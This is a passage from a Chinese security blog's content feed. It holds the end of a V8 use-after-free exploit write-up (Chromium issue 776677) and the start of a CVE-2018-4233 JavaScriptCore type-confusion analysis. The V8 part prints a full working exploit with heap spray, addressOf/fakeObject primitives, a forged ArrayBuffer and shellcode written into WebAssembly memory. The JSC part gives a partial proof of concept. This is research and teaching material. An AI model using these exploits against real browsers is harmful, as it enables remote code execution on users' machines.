eax,[ebp+0x8]0x255062c8     8  e8d303b035     call 0x5b0066a0  (ToNumber)    ;; code: BUILTIN0x255062cd     d  a801           test al,0x10x255062cf     f  0f8528000000   jnz 0x255062fd  &lt;+0x3d&gt;0x255062d5    15  d1f8           sar eax,1.....................\n可以看到，因为我们在asm.js模块中声明x = x | 0;，所以会先调用ToNumber获取对象x的值，而ToNumber会调用对象内部的toString函数，因此，我们可以重写toString函数，并在toString函数里开始Heap Spray。\n//堆喷var victim_array = [];victim_array.length = 0x750;var array = [1.1];array.length = 0x10000;array.fill(2.2);function spray_heap() &#123;    for(var i = 0;i &lt; victim_array.length;i++)&#123;        victim_array[i] = array.slice(0,array.length);    &#125;&#125;..........................//重写对象的toString函数，这样在执行ToNumber时可以同时触发Hpeap Spraytrigger = &#123;&#125;;trigger.toString = function()&#123;    spray_heap();    return 0xffffffff;&#125;;evil_f(trigger);\n使用gdb调试，然后断在崩溃处\n EAX  0x6666666a (&#x27;jfff&#x27;) EBX  0x80108 ECX  0xc80000 EDX  0xf4cb4000 EDI  0x5403aff1 —▸ 0x4e536848 ◂— 0x9999999a ESI  0x5858aab0 ◂— 0xf4cb4000 EBP  0xffcd9da8 —▸ 0xffcd9df8 —▸ 0xffcd9e10 —▸ 0xffcd9e38 —▸ 0xffcd9ee8 ◂— ... ESP  0xffcd9d9c —▸ 0x52786292 ◂— mov    eax, 0x27184185 /* 0x184185b8 */ EIP  0x527864ee ◂— mov    dword ptr [edx + ebx], eax /* 0xbb1a0489 */───────────────────────────────────────────────────────────────────────────────────[ DISASM ]─────────────────────────────────────────────────────────────────────────────────── ► 0x527864ee    mov    dword ptr [edx + ebx], eax\n当前访问的地址是0xf4cb4000，查看其附近的内存\n.................0xf4024000 0xf4cb4000 rw-p   c90000 0      0xf4d80000 0xf4e05000 rw-p    85000 0      0xf4e80000 0xf4f05000 rw-p    85000 0      ...............\n可以看到0xf4cb4000上方和下方很多0x85000大小的内存空间，这是正是堆喷到此处的一些Array对象以及Elements对象，我们在gdb中使用find命令查找紧挨着的一块内存里的关键字\nfind /w4 0xf4d80000,0xf4e05000,0x9999999a\n结果如下，我们看到最近的一个数据位于0xf4d84108，可以看到该处正是某一个Array对象的Element，它与backing_store之间相差0xd0108，这个偏移并不是固定不变的，但是后12bit是固定不变的。\n0xf4d841080xf4d841100xf4d841180xf4d84120pwndbg&gt; x /20wx 0xf4d84108-0x80xf4d84100:\t0x536846f1\t0x00020000\t0x9999999a\t0x40019999\n我们可以将所有的可能偏移都罗列出来，由于这些偏移在之前那个ArrayBuffer的length范围之内，也就是说该对象存在于那个UAF的空间里，于是我们可以利用UAF来改写Element，我们可以修改Element的length属性，这样，我们可以后续构造出一个oob数组，为了区别，我们还需要修改Element的第一个元素，这样方便我们找到到底是哪个Array的Element堆喷于此处。为了方便罗列这些可能的偏移，并进行写，我们使用JS的模板来生成多种可能的偏移写语句，方便操作\n//距离不是固定的，因此需要将所有可能的距离都赋值,我们要修改Element的length和第一个元素let loop = &quot;&quot;;for(let i = 0; i &lt; 0xd0; i++) &#123;    loop += `fl[$&#123;0x21041 + 0x100 * i&#125;] = x;fl[$&#123;0x21042 + 0x100 * i&#125;] = x;`;&#125;let eval_str = `function module(stdlib, foreign, buffer) &#123;    &quot;use asm&quot;;    var fl = new stdlib.Uint32Array(buffer);    function foo(x) &#123;        x = x | 0;        $&#123;loop&#125;    &#125;    return foo;&#125;`eval(eval_str);\n接下来就是搜索哪个被修改过的Array对象了\n//找到那个能够被我们UAF控制的Arrayvar corrupted_array = undefined;for(var i = 0; i &lt; victim_array.length; i++) &#123;    tmp = victim_array[i];    if (tmp[0] !== 2.2) &#123;        console.log(&quot;[+] array at : &quot; + i);        corrupted_array = victim_array[i];        break;    &#125;&#125;\n同时，我们得继续寻找该Array对象Elements后方的Elements属于哪个Array，其中注意到，由于corrupted_array的elements的length被我们修改成了0xFFFFFFFF，因此在这里加大length，elements仍然不变，相当于构造了一个oob数组，这个特性也是新学到的。\n//寻找corrupted_array的后面是哪个Array对象的elementsvar next_array_idx = undefined;var tag = p64f(0x12345678,0x78563412)if (corrupted_array != undefined) &#123;    //由于elements的length被我们修改，因此在这里加大length，elements仍然不变，相当于构造了一个oob数组    corrupted_array.length = 0x200000;    let leaked_idx = undefined;    if (corrupted_array[0x20000] == 2.2) &#123;        corrupted_array[0x20000] = tag; //设置一个标记        //搜索标记        for(let i = 0; i &lt; victim_array.length; i++) &#123;            tmp = victim_array[i];            if (tmp[0] == tag) &#123;                tmp = undefined;                console.log(&quot;[+] next array at : &quot; + i);                next_array_idx = i;                break;            &#125;        &#125;    &#125;&#125; else &#123;    console.log(&quot;[-] fail&quot;);&#125;\n我们搜索next_array的目的是为了将next_array进行释放。这样方便我们进行第二轮Heap Spray，将其他对象布局到此处，然后用corrupted_array 进行控制。\nfunction gc() &#123;   for (let i = 0; i &lt; 0x10; i++) &#123;      new ArrayBuffer(0x1000000);   &#125;&#125;//corrupted_array后方的内存释放掉，然后我们将其他对象堆喷到此处victim_array[next_array_idx] = null;gc();//堆喷var obj = &#123;&#125;;array = [obj];array.length = 0x2000;array.fill(obj);for(var i = 0;i &lt; victim_array.length;i++)&#123;   victim_array[i] = array.slice(0,array.length);&#125;\n这里，我们victim_array[next_array_idx] = null;使得该处对象失去了引用，然后通过申请大量的内存new ArrayBuffer(0x1000000);触发了垃圾回收器将next_array的内存回收，这样corrupted_array后方的内存就空闲了，然后我们堆喷多个HOLEY_ELEMENTS类型的Array，因为该Array存储着的是对象的指针，因此，我们结合corrupted_array和该处的Array，就可以构造addressOf原语和fakeObject原语。其构造布置比较简单，这里不再叙述。然后后续利用也比较容易了。\nexpfunction gc() &#123;   for (let i = 0; i &lt; 0x10; i++) &#123;      new ArrayBuffer(0x1000000);   &#125;&#125;var buf = new ArrayBuffer(0x8);var dv = new DataView(buf);function p64f(value1,value2) &#123;   dv.setUint32(0,value1,true);   dv.setUint32(0x4,value2,true);   return dv.getFloat64(0,true);&#125;function u64f(value) &#123;   dv.setFloat64(0,value,true);   return [dv.getUint32(0,true),dv.getUint32(4,true)];&#125;//距离不是固定的，因此需要将所有可能的距离都赋值,我们要修改Element的length和第一个元素let loop = &quot;&quot;;for(let i = 0; i &lt; 0xd0; i++) &#123;    loop += `fl[$&#123;0x21041 + 0x100 * i&#125;] = x;fl[$&#123;0x21042 + 0x100 * i&#125;] = x;`;&#125;let eval_str = `function module(stdlib, foreign, buffer) &#123;    &quot;use asm&quot;;    var fl = new stdlib.Uint32Array(buffer);    function foo(x) &#123;        x = x | 0;        $&#123;loop&#125;    &#125;    return foo;&#125;`eval(eval_str);//堆喷var victim_array = [];victim_array.length = 0x750;var array = [1.1];array.length = 0x10000;array.fill(2.2);function spray_heap() &#123;    for(var i = 0;i &lt; victim_array.length;i++)&#123;        victim_array[i] = array.slice(0,array.length);    &#125;&#125;var global = &#123;Uint32Array:Uint32Array&#125;;var env = &#123;&#125;;var memory = new WebAssembly.Memory(&#123;initial:200&#125;);var buffer = memory.buffer;var evil_f = module(global,env,buffer);evil_f(1);//%DebugPrint(memory);//%SystemBreak();//evil_f(1);//制造UAFmemory.grow(1);//%DebugPrint(buffer);//重写对象的toString函数，这样在执行ToNumber时可以同时触发Hpeap Spraytrigger = &#123;&#125;;trigger.toString = function()&#123;    spray_heap();    return 0xffffffff;&#125;;evil_f(trigger);//找到那个能够被我们UAF控制的Arrayvar corrupted_array = undefined;for(var i = 0; i &lt; victim_array.length; i++) &#123;    tmp = victim_array[i];    if (tmp[0] !== 2.2) &#123;        console.log(&quot;[+] array at : &quot; + i);        corrupted_array = victim_array[i];        break;    &#125;&#125;//寻找corrupted_array的后面是哪个Array对象的elementsvar next_array_idx = undefined;var tag = p64f(0x12345678,0x78563412)if (corrupted_array != undefined) &#123;    //由于elements的length被我们修改，因此在这里加大length，elements仍然不变，相当于构造了一个oob数组    corrupted_array.length = 0x200000;    let leaked_idx = undefined;    if (corrupted_array[0x20000] == 2.2) &#123;        corrupted_array[0x20000] = tag; //设置一个标记\t//搜索标记        for(let i = 0; i &lt; victim_array.length; i++) &#123;            tmp = victim_array[i];            if (tmp[0] == tag) &#123;                tmp = undefined;                console.log(&quot;[+] next array at : &quot; + i);                next_array_idx = i;                break;            &#125;        &#125;    &#125;&#125; else &#123;    console.log(&quot;[-] fail&quot;);&#125;//%DebugPrint(victim_array[next_array_idx]);//corrupted_array后方的内存释放掉，然后我们将其他对象堆喷到此处victim_array[next_array_idx] = null;gc();//堆喷var obj = &#123;&#125;;array = [obj];array.length = 0x2000;array.fill(obj);for(var i = 0;i &lt; victim_array.length;i++)&#123;   victim_array[i] = array.slice(0,array.length);&#125;function addressOf(m_obj) &#123;   for(var i = 0;i &lt; victim_array.length;i++)&#123;      victim_array[i][0] = m_obj;   &#125;   return u64f(corrupted_array[0x20000])[0] - 0x1;&#125;var tag = &#123;a:1.1&#125;;var tag_addr = addressOf(tag);//print(&quot;tag_addr=&quot; + tag_addr.toString(16));//寻找corrupted_array后面是哪一个Arraynext_array_idx = undefined;corrupted_array[0x20001] = p64f(tag_addr+0x1,0x123456);//搜索标记for(let i = 0; i &lt; victim_array.length; i++) &#123;   tmp = victim_array[i];   if (tmp[2] == tag) &#123;      tmp = undefined;      console.log(&quot;[+] next array at : &quot; + i);      next_array_idx = i;      break;   &#125;&#125;if (next_array_idx == undefined) &#123;   throw &quot;error&quot;&#125;function fakeObject(addr) &#123;   corrupted_array[0x20000] = p64f(addr+0x1,0x123456);   return victim_array[next_array_idx][0];&#125;const wasmCode = new Uint8Array([0x00,0x61,0x73,0x6D,0x01,0x00,0x00,0x00,0x01,0x85,0x80,0x80,0x80,0x00,0x01,0x60,0x00,0x01,0x7F,0x03,0x82,0x80,0x80,0x80,0x00,0x01,0x00,0x04,0x84,0x80,0x80,0x80,0x00,0x01,0x70,0x00,0x00,0x05,0x83,0x80,0x80,0x80,0x00,0x01,0x00,0x01,0x06,0x81,0x80,0x80,0x80,0x00,0x00,0x07,0x91,0x80,0x80,0x80,0x00,0x02,0x06,0x6D,0x65,0x6D,0x6F,0x72,0x79,0x02,0x00,0x04,0x6D,0x61,0x69,0x6E,0x00,0x00,0x0A,0x8A,0x80,0x80,0x80,0x00,0x01,0x84,0x80,0x80,0x80,0x00,0x00,0x41,0x2A,0x0B]);const shellcode = new Uint32Array([795371626, 1752379183, 1852400175, 23651209, 2164326657, 1769088052, 3375431937, 1493461585, 2303844609, 1792160225, 2160941067]);var wasmModule = new WebAssembly.Module(wasmCode);var wasmInstance = new WebAssembly.Instance(wasmModule);var func = wasmInstance.exports.main;var wasm_shellcode_ptr_addr = addressOf(func) + 0x18;print(&#x27;wasm_shellcode_ptr_addr=&#x27; + wasm_shellcode_ptr_addr.toString(16));var proto_addr = addressOf(ArrayBuffer.prototype);var faker = [1.1,2.2,3.3,4.4,5.5,6.6,7.7,8.8,9.9];var faker_addr = addressOf(faker);//fake a ArrayBuffer Mapfaker[0] = p64f(0,0x0f0a000a);faker[1] = p64f(0x000900c6,0x082003ff);faker[2] = p64f(proto_addr,0);var map_addr = faker_addr + 0x20;print(&quot;map_addr=&quot; + map_addr.toString(16));//fake a ArrayBufferfaker[4] = p64f(map_addr+0x1,0x3b90412d);faker[5] = p64f(0x3b90412d,0x100);faker[6] = p64f(wasm_shellcode_ptr_addr,0);faker[7] = p64f(0x800,4);var fake_arr_buf = fakeObject(faker_addr + 0x40);var adv = new DataView(fake_arr_buf);var wasm_shellcode_addr = adv.getUint32(0,true) + 0x3f;print(&#x27;wasm_shellcode_addr=&#x27; + wasm_shellcode_addr.toString(16));faker[6] = p64f(wasm_shellcode_addr,wasm_shellcode_addr);//%SystemBreak();//替换wasm的shellcodefor (var i=0;i&lt;shellcode.length;i++) &#123;   adv.setUint32(i*4,shellcode[i],true);&#125;//%SystemBreak();func();\n\n0x04 感想本次漏洞复现，学习了很多新知识，对于V8 UAF方面的漏洞还是第一次接触，结合Heap Spray也是第一次，收获比较大。\n0x05 参考asm.js：面向未来的开发asm.js 和 Emscripten 入门教程Issue 776677: Security: V8:Use After Free Leads to Remote Code Execution\n","categories":["CTF","安全研究","CVE"],"tags":["JS引擎漏洞","类型混淆","heap spray"]},{"title":"Pwn2Own 2018 CVE-2018-4233 分析","url":"/2021/06/21/CVE-2018-4233/","content":"文章首发于安全KER https://www.anquanke.com/post/id/244472\n0x00 前言JavaScriptCore是Apple的WebKit浏览器内核中的JS引擎，最近学习JavaScriptCore引擎的漏洞利用，在此以CVE-2018-4233为例来学习JavaScriptCore引擎的漏洞利用一般思路\n0x01 前置知识JSC引擎执行流程JSC引擎执行JS代码的流程如下\n\nLexer：词法分析，提取单词Parser：语法分析，生成语法树，并从语法树中构建ByteCodeLLInt：Low Level Interpreter执行Parser生成的ByteCode，其代码位于源码树中的llint&#x2F;文件夹Baseline JIT: 在函数调用了 6 次，或者某段代码循环了大于100次会触发该引擎进行JIT编译，其编译后的代码仍然为中间码，而不是汇编代码。其代码位于源码树中的jit&#x2F;文件夹DFG JIT: 在函数被调用了60次或者代码循环了1000次会触发。DFG是基于控制流图分析的优化器，将低效字节码进行优化并转为机器码。它利用LLInt和Baseline JIT阶段收集的一些信息来优化字节码，消除一些类型检查等。其代码位于源码树中的dfg&#x2F;文件夹FTL: Faster Than Light，更高度的优化，在函数被调用了上千次或者代码循环了数万次会触发。通过一些更加细致的优化算法，将DFG IR进一步优化转为 FTL 里用到的 B3 的 IR，然后生成机器码\n可以知道，Baseline JIT-&gt;DFG JIT-&gt;FTL每一个过程都进行了更加深入的优化，优化一般就是通过类型收集和判断，消除一些不必要的类型检查，并生成机器码，从而可以节省运行时间。由于js是动态类型语言，当类型优化推断错误时，便可以返回上一级，比如DFG JIT优化错误，则返回Baseline JIT运行同时重新进行类型收集以便下一次优化。这个执行过程的转移使用的方法是堆栈替换 on-stack replacement，简称 OSR。这个技术可以将执行转移到任何 statement 的地方。\nclobberWorld在DFG的遍历优化中，会进行类型收集，如果要之前推断的类型不正确，则调用clobberWorld函数放弃之前推断信息，如果不调用该函数，那么前面的类型信息继续保留。\nJSC断点调试与V8不同的是，JSC没有提供用于断点调试的js函数，一种简便的方法是在printInternal函数上进行断点\nb *printInternal\n然后在js代码中调用print，即可断下。如果我们要打印信息，利用debug函数来打印，因为print已经被我们拿去断点用了。另一种方法是我们自己在Source&#x2F;JavaScriptCore&#x2F;jsc.cpp源码中增加一个dbg函数，并在函数中实现int3指令，然后就能在js中调用。\nJSC对象内存模型首先使用这段代码进行调试，其中describe函数是用来打印对象结构的，debug是用于输出文字的,print用于断点\nvar obj = &#123;&#125;;var a = &#123;a:1,b:2,c:2.2,d:obj,e:3,f:4,g:5,h:6,i:7,j:8,k:9,l:10&#125;;debug(describe(a));print();\n输出如下\n--&gt; Object: 0x7fffaf8ac000 with butterfly (nil) (Structure 0x7fffaf870460:[Object, &#123;a:0, b:1, c:2, d:3, e:4, f:5, g:6, h:7, i:8, j:9, k:10, l:11&#125;, NonArray, Proto:0x7fffaf8c8020, Leaf]), StructureID: 297\n使用gdb打印对象地址处的内容\npwndbg&gt; x /20gx 0x7fffaf8ac0000x7fffaf8ac000:    0x0100150000000129    0x00000000000000000x7fffaf8ac010:    0x0000000000000000    0xffff0000000000010x7fffaf8ac020:    0xffff000000000002    0x400299999999999a0x7fffaf8ac030:    0x00007fffaf8b0100    0xffff0000000000030x7fffaf8ac040:    0xffff000000000004    0xffff0000000000050x7fffaf8ac050:    0xffff000000000006    0xffff0000000000070x7fffaf8ac060:    0xffff000000000008    0xffff0000000000090x7fffaf8ac070:    0xffff00000000000a    0x00000000000000000x7fffaf8ac080:    0x0000000000000000    0x00000000000000000x7fffaf8ac090:    0x0000000000000000    0x0000000000000000\n可以看到，我们的数据都依次按照顺序存入了对象的内存中，并且可以发现不同类型之间的存储，其最前面有一些标志数据，总结起来如下：\nPointer： [0000][xxxx:xxxx:xxxx]（前两个字节为0，后六个字节寻址）Double： [0001～FFFE][xxxx:xxxx:xxxx]Integer： [FFFF][0000:xxxx:xxxx]（只有低四个字节表示数字）False： [0000:0000:0000:0006]True： [0000:0000:0000:0007]Undefined： [0000:0000:0000:000a]Null： [0000:0000:0000:0002]\n可以发现，对于对象类型，由于标记为0，所以直接存储着的就是指针，而Double和Integer最前面都加了标记。现在我们将代码修改一下并测试\nvar obj = &#123;&#125;;var a = &#123;a:1,b:2,c:2.2,d:obj,e:3,f:4,g:5,h:6,i:7,j:8,k:9,l:10&#125;;a.m = 11;a.n = 12;a.o = 13;a.p = 14;a.q = 15;a[0] = 16;a[1] = 17;debug(describe(a));print();\n打印如下\n--&gt; Object: 0x7fffaf8ac000 with butterfly 0x7ff0000fe5a8 (Structure 0x7fffaf870700:[Object, &#123;a:0, b:1, c:2, d:3, e:4, f:5, g:6, h:7, i:8, j:9, k:10, l:11, m:12, n:13, o:14, p:15, q:16&#125;, NonArrayWithInt32, Proto:0x7fffaf8c8020, Leaf]), StructureID: 303\n可以看到butterfly已经不是null了，我们查看一下对象内存\npwndbg&gt; x /30gx 0x7fffaf8ac0000x7fffaf8ac000:    0x010015040000012f    0x00007ff0000fe5a80x7fffaf8ac010:    0x0000000000000003    0xffff0000000000010x7fffaf8ac020:    0xffff000000000002    0x400299999999999a0x7fffaf8ac030:    0x00007fffaf8b0100    0xffff0000000000030x7fffaf8ac040:    0xffff000000000004    0xffff0000000000050x7fffaf8ac050:    0xffff000000000006    0xffff0000000000070x7fffaf8ac060:    0xffff000000000008    0xffff0000000000090x7fffaf8ac070:    0xffff00000000000a    0xffff00000000000b0x7fffaf8ac080:    0xffff00000000000c    0xffff00000000000d0x7fffaf8ac090:    0xffff00000000000e    0xffff00000000000fpwndbg&gt; x /20gx 0x00007ff0000fe5a80x7ff0000fe5a8:    0xffff000000000010    0xffff0000000000110x7ff0000fe5b8:    0x0000000000000000    0x00000000badbeef0\n\n可以看到，butterfly里存储着数组的元素，而其他属性则仍然存储于对象中，我们称这些为内联属性，因为其存储于对象内部。现在测试代码再修改一下\nvar obj = &#123;&#125;;var a = &#123;a:1,b:2,c:2.2,d:obj,e:3,f:4,g:5,h:6,i:7,j:8,k:9,l:10&#125;;a.m = 11;a.n = 12;a.o = 13;a.p = 14;a.q = 15;a[0] = 16;a[1] = 17;a[&#x27;r&#x27;] = 18;debug(describe(a));print();\n输出如下\n--&gt; Object: 0x7fffaf8ac000 with butterfly 0x7fec000f8468 (Structure 0x7fffaf870770:[Object, &#123;a:0, b:1, c:2, d:3, e:4, f:5, g:6, h:7, i:8, j:9, k:10, l:11, m:12, n:13, o:14, p:15, q:16, r:100&#125;, NonArrayWithInt32, Proto:0x7fffaf8c8020, Leaf]), StructureID: 304pwndbg&gt; x /20gx 0x7fec000f8468-0x100x7fec000f8458:    0xffff000000000012    0x00000003000000020x7fec000f8468:    0xffff000000000010    0xffff000000000011\n可以知道a[‘r’] &#x3D; 18;这句代码，18存储于butterfly上方，由于其是数组的操作方式，因此其不再归为内联属性，同时我们还注意到butterfly-0x8处的数据0x0000000300000002，这代表数组的大小和容量。总结出JSC的对象结构如下：\n\n其中JSCell是一个结构体，其中有StructureID等成员，在源码目录中的Tools&#x2F;gdb&#x2F;webkit.py文件是用于gdb调试的脚本插件，我们导入gdb，然后进行调试查看。\npwndbg&gt; p *(JSC::JSCell *)0x7fffaf8b42d0$2 = &#123;  &lt;JSC::HeapCell&gt; = &#123;&lt;No data fields&gt;&#125;,   members of JSC::JSCell:   static StructureFlags = 0,   static needsDestruction = false,   static TypedArrayStorageType = JSC::NotTypedArray,   m_structureID = 284,   m_indexingTypeAndMisc = 0 &#x27;\\000&#x27;,   m_type = JSC::FinalObjectType,   m_flags = 0 &#x27;\\000&#x27;,   m_cellState = JSC::CellState::DefinitelyWhite&#125;\n其中JSCell的作用类似于V8中的Map，用于表示对象类型，与V8不同的是，类型的关键在于JSCell使用StructureID来区分类型，StructureID是一个类似于index下标的作用，真正的Structure指针存储在一个StructureTable中，判断对象的时候通过index从StructureTable取出Structure的地址，进而访问Structure，Structure表明了对象的原型，对象结构相同则具有相同的StructureID。\nJSC::StructureIDTable::get(JSC::StructureID)\n使用如下代码测试\nvar a = &#123;x:1,y:2&#125;;var b = &#123;x:3,y:4&#125;;var c = &#123;a:5,b:6&#125;;debug(describe(a));debug(describe(b));debug(describe(c));print();\n输出如下\n--&gt; Object: 0x7fffaf8b42d0 with butterfly (nil) (Structure 0x7fffaf8a7d40:[Object, &#123;x:0, y:1&#125;, NonArray, Proto:0x7fffaf8c8020, Leaf]), StructureID: 284--&gt; Object: 0x7fffaf8b4300 with butterfly (nil) (Structure 0x7fffaf8a7d40:[Object, &#123;x:0, y:1&#125;, NonArray, Proto:0x7fffaf8c8020, Leaf]), StructureID: 284--&gt; Object: 0x7fffaf8b4330 with butterfly (nil) (Structure 0x7fffaf8a7e20:[Object, &#123;a:0, b:1&#125;, NonArray, Proto:0x7fffaf8c8020, Leaf]), StructureID: 286\n可以看到a和b具有相同的StructureID和Structure。\n伪造对象从上述可以知道，JSCell就是一串数值，包含着StructureID，而不是指针，并且在一些版本中，StructureID不是随机的，而是按照不同对象创建的顺序递增，因此我们想要伪造数组对象的话，可以先申请N个数组对象，然后稍微添加一个不同的属性，则它们的StructureID不同，然后我们猜测一个StructureID，只要确保其很大概率落在已有的这些StructureID之中即可。\n查看优化的数据与V8中的–trace-turbo类似的，JSC中提供了-p选项用于输出profiling data，里面包含一些优化时的数据、字节码等。profiling data格式为json，JSC没有提供像V8那样的可视化工具用于查看流图，我们就只能看看JSON数据。\n\n\n0x02 漏洞分析利用patch分析index e7f1585..fc1a7c5 100644 (file)--- a/Source/JavaScriptCore/dfg/DFGAbstractInterpreterInlines.h+++ b/Source/JavaScriptCore/dfg/DFGAbstractInterpreterInlines.h@@ -1,5 +1,5 @@ /*- * Copyright (C) 2013-2017 Apple Inc. All rights reserved.+ * Copyright (C) 2013-2018 Apple Inc. All rights reserved.  *  * Redistribution and use in source and binary forms, with or without  * modification, are permitted provided that the following conditions@@ -2274,6 +2274,7 @@ bool AbstractInterpreter&lt;AbstractStateType&gt;::executeEffects(unsigned clobberLimi                 &#125;             &#125;         &#125;+        clobberWorld(node-&gt;origin.semantic, clobberLimit);         forNode(node).setType(m_graph, SpecFinalObject);         break;     &#125;\n该patch修复了漏洞，patch位于文件Source&#x2F;JavaScriptCore&#x2F;dfg&#x2F;DFGAbstractInterpreterInlines.h中的executeEffects函数，从文件路径可以知道，这个漏洞与DFG JIT有关，executeEffects是当DFG JIT做优化时处理side Effects时用的,与v8一个道理，side Effects即一些潜在的侧链影响，通俗来讲就是判断某个操作是否会影响类型变化，如果会影响，放弃之前的类型推断，如果不影响，继续使用之前的类型。patch位于函数中switch的case CreateThis:分支，主要就是遍历字节码，遇到CreateThis时，调用clobberWorld函数放弃前面的类型推断。那么这也就是说，原来的漏洞点在于CreateThis是存在会影响对象类型的，但是DFG JIT没有判断出来，这就导致类型混淆。\nPOC构造首先，要得到create_this字节码，使用的是this\nfunction foo() &#123;   this.x = 1;&#125;var b = new foo();print(b.x);\n得到的字节码如下\n[   0] enter             [   1] get_scope         loc3[   3] mov               loc4, loc3[   6] check_traps       [   7] mov               loc5, this[  10] create_this       this, this, 1, 0[  15] put_by_id         this, x(@id0), Int32: 1(const0), Bottom[  24] ret               this\n可以看到，通过put_by_id字节码指令将1存入x属性中。现在我们将测试代码稍作修改\nfunction foo(arg) &#123;   this.x = arg[0];&#125;var b = new foo([1.1]);print(b.x);\n字节码如下\n[   0] enter             [   1] get_scope         loc3[   3] mov               loc4, loc3[   6] check_traps       [   7] mov               loc5, this[  10] create_this       this, this, 1, 0[  15] mov               loc6, this[  18] get_by_val        loc7, arg1, Int32: 0(const0)    Original; predicting None[  24] put_by_id         loc6, x(@id0), loc7, Bottom[  33] ret               this\n通过get_by_val字节码指令从数组中取出元素0，然后通过put_by_id存入属性x中。现在加入触发DFG JIT优化的代码，再做测试,发现前期Parse以后的字节码是一样的，不同点在于这次存在了DFG JIT时的字节码展开，其中[ 10] create_this this, this, 1, 0和[ 18] get_by_val loc7, arg1, Int32: 0(const0) Original; predicting None被展开如下\n[10]CountExecutionCheckCellNewObjectMovHint[18]CountExecutionJSConstantGetButterflyGetByValMovHintValueRep\n可以知道，CreateThis被优化为了CheckCell和NewObject，并且在这种情况下参数arg的类型不可能发生变化，因此在[ 0] enter使用了CheckStructure检查一次参数就可以了，这里无需再重复检查。现在，我们尝试为foo函数增加一个Proxy代理，这样，使用foo_proxy对象对foo进行间接访问时，会被代理拦截，并进入handler的get函数中处理。\nfunction foo(arg) &#123;   this.x = arg[0];&#125;let handler = &#123;   get(target, prop) &#123;      print(prop);      return target[prop];   &#125;&#125;;let foo_proxy = new Proxy(foo, handler);print(foo_proxy.a);\n输出如下\nroot@ubuntu:~/Desktop/bug_bin# ./jsc t.jsa\n因为我们通过foo_proxy.a间接的访问了foo.a属性，所以被拦截了。那我们使用new foo_proxy()会发生什么呢？\nfunction foo(arg) &#123;   this.x = arg[0];&#125;let handler = &#123;   get(target, prop) &#123;      print(prop);      return target[prop];   &#125;&#125;;let foo_proxy = new Proxy(foo, handler);print(new foo_proxy([1.1]));\n输出如下\nroot@ubuntu:~/Desktop/bug_bin# ./jsc t.jsprototype\n因为在创建一个对象的时候，是需要用到函数的prototype这个属性的，它是函数的原型，也是foo的一个自带属性，因此在创建对象时也可以被成功拦截。我们尝试加入DFG JIT优化，并查看字节码\nfunction foo(arg) &#123;   this.x = arg[0];&#125;let handler = &#123;   get(target, prop) &#123;      return target[prop];   &#125;&#125;;let foo_proxy = new Proxy(foo, handler);var b;for (var i=0;i&lt;0x2000;i++) &#123;   b = new foo_proxy([1.1]);&#125;print(b.x);\nByteCode仍然一样，不一样的是DFG JIT的Code\n[10]CountExecutionCreateThisMovHint[18]CountExecutionJSConstantGetButterflyGetByValMovHintValueRep\n可以看到，由于我们加入了代理，现在CreateThis不能再被内联优化，其中CreateThis的汇编调用代码如下\n0x7fffb010016e: mov $0x7fffaff0b4a8, %r110x7fffb0100178: mov (%r11), %r110x7fffb010017b: test %r11, %r110x7fffb010017e: jz 0x7fffb010018b0x7fffb0100184: mov $0x113, %r11d0x7fffb010018a: int3 0x7fffb010018b: cmp $0x17, 0x5(%rsi)0x7fffb010018f: jnz 0x7fffb01005650x7fffb0100195: mov 0x28(%rsi), %r80x7fffb0100199: test %r8, %r80x7fffb010019c: jz 0x7fffb0100565............................\n可以知道其主要是跳转到了0x7fffb0100565这个地址处，继续跟踪，该地址处的代码\n0x7fffb0100565: mov %rax, -0x30(%rbp)0x7fffb0100569: mov %rsi, -0x38(%rbp)0x7fffb010056d: mov %rbp, %rdi0x7fffb0100570: mov $0x1, %edx0x7fffb0100575: mov $0x7fffaff09898, %r110x7fffb010057f: mov $0xbadbeef, (%r11)0x7fffb0100586: mov $0x7fffaff0989c, %r110x7fffb0100590: mov $0xbadbeef, (%r11)0x7fffb0100597: mov $0x6, 0x24(%rbp)0x7fffb010059e: mov $0x7ffff6113791, %r110x7fffb01005a8: call *%r11\n\n通过调试，可以知道这里调用的函数是operationCreateThis这个函数，其源码位于文件Source&#x2F;JavaScriptCore&#x2F;dfg&#x2F;DFGOperations.cpp中\nJSC_DEFINE_JIT_OPERATION(operationCreateThis, JSCell*, (JSGlobalObject* globalObject, JSObject* constructor, uint32_t inlineCapacity))&#123;    VM&amp; vm = globalObject-&gt;vm();    CallFrame* callFrame = DECLARE_CALL_FRAME(vm);    JITOperationPrologueCallFrameTracer tracer(vm, callFrame);    auto scope = DECLARE_THROW_SCOPE(vm);    if (constructor-&gt;type() == JSFunctionType &amp;&amp; jsCast&lt;JSFunction*&gt;(constructor)-&gt;canUseAllocationProfile()) &#123;        DeferTermination deferScope(vm);        auto rareData = jsCast&lt;JSFunction*&gt;(constructor)-&gt;ensureRareDataAndAllocationProfile(globalObject, inlineCapacity);        scope.releaseAssertNoException();        ObjectAllocationProfileWithPrototype* allocationProfile = rareData-&gt;objectAllocationProfile();        Structure* structure = allocationProfile-&gt;structure();        JSObject* result = constructEmptyObject(vm, structure);        if (structure-&gt;hasPolyProto()) &#123;            JSObject* prototype = allocationProfile-&gt;prototype();            ASSERT(prototype == jsCast&lt;JSFunction*&gt;(constructor)-&gt;prototypeForConstruction(vm, globalObject));            result-&gt;putDirect(vm, knownPolyProtoOffset, prototype);            prototype-&gt;didBecomePrototype();            ASSERT_WITH_MESSAGE(!hasIndexedProperties(result-&gt;indexingType()), &quot;We rely on JSFinalObject not starting out with an indexing type otherwise we would potentially need to convert to slow put storage&quot;);        &#125;        return result;    &#125;    JSValue proto = constructor-&gt;get(globalObject, vm.propertyNames-&gt;prototype);    RETURN_IF_EXCEPTION(scope, nullptr);    if (proto.isObject())        return constructEmptyObject(globalObject, asObject(proto));    JSGlobalObject* functionGlobalObject = getFunctionRealm(globalObject, constructor);    RETURN_IF_EXCEPTION(scope, nullptr);    return constructEmptyObject(functionGlobalObject);&#125;\n其中的操作SValue proto &#x3D; constructor-&gt;get(globalObject, vm.propertyNames-&gt;prototype);会被我们JS层中的代理拦截，由此可以知道，operationCreateThis会回调JS层的代理函数。此时我们想到，在JS中的Proxy对象的handler中，我们可以操纵任意的对象，我们可以将参数arg的类型修改掉。于是这样构造\nfunction foo(arg) &#123;   this.x = arg[0];&#125;var trigger = false;var arr = [1.1,2.2];let handler = &#123;   get(target, prop) &#123;      if (trigger) &#123;         arr[0] = &#123;&#125;;      &#125;      return target[prop];   &#125;&#125;;let foo_proxy = new Proxy(foo, handler);var b;for (var i=0;i&lt;0x2000;i++) &#123;   b = new foo_proxy(arr);&#125;trigger = true;b = new 